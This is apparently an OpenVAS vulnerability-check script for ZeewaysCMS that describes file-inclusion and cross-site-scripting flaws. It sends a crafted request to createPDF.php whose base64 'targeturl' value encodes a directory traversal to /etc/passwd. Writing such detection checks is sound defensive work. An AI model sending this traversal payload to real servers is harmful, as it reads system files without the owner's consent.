###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_zeeways_multiple_vuln.nasl 5520 2017-03-08 17:02:55Z teissa $
#
# ZeewaysCMS Multiple Vulnerabilities
#
# Authors:
# Kashinath T <tkashinath@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:zeewayscms:zeeway';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.808108");
  script_version("$Revision: 5520 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-03-08 18:02:55 +0100 (Wed, 08 Mar 2017) $");
  script_tag(name:"creation_date", value:"2016-06-03 17:28:28 +0530 (Fri, 03 Jun 2016)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("ZeewaysCMS Multiple Vulnerabilities");

  script_tag(name:"summary", value:"This host is running ZeewaysCMS and is prone to
  multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET method 
  and check whether we can get password information or not.");

  script_tag(name:"insight", value:"Multiple flaws are due to,
  - When input passed via 'targeturl' GET parameter in 'createPDF.php'
    script is not properly verified before being used to include files.
  - when input passed via multiple POST parameters 
    'screen_name', 'f_name', 'l_name', 'uc_email', 'uc_mobile' and 'user_contact_num'
    are not properly sanitized before being returned to the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow a remote
  attackers to read arbitrary files via unspecified vectors and also to execute 
  arbitrary script code in a user's browser session within the trust relationship 
  between their browser and the server.
                                                                                                                                    
  Impact Level: Application");

  script_tag(name:"affected", value:"ZeewaysCMS");

  script_tag(name:"solution", value:"No solution or patch is available as of
  08th March, 2017. Information regarding this issue will be updated once
  the solution details are available. For updates refer to
  http://www.zeewayscms.com/");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39784/");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_dependencies("gb_zeeways_cms_detect.nasl");
  script_mandatory_keys("ZeewaysCMS/Installed");
  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
url = "";
dir = "";
zeePort = 0;

## Get HTTP Port
if(!zeePort = get_app_port(cpe:CPE)){
  exit(0);
}

## Get Location
if(!dir = get_app_location(cpe:CPE, port:zeePort)){
  exit(0);
}

if(dir == "/"){
  dir = "";
}

## Get host name or IP
host = http_host_name(port:zeePort);
if(!host){
  exit(0);
}

## Vulnerable URL
url =  dir + '//createPDF.php?targeturl=Ly4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2Q=&&pay_id=4&&type=actual';

##Construct attack request
req = string('GET ' +url+ ' HTTP/1.1\r\n',
             'Host: '+host+'\r\n',
             '\r\n');
res1 = http_keepalive_send_recv(port:zeePort, data:req);

if('HTTP/1.1 200 OK' >< res1 && 'Content-Disposition: inline; filename="download.pdf"' >< res1 &&
   '42697473506572436f6d706f6e656e74' >< hexstr(res1) && '4372656174696f6e44617465' >< hexstr(res1))
{
  report = report_vuln_url( port:zeePort, url:url );
  security_message(port:zeePort, data:report);
  exit(0); 
}
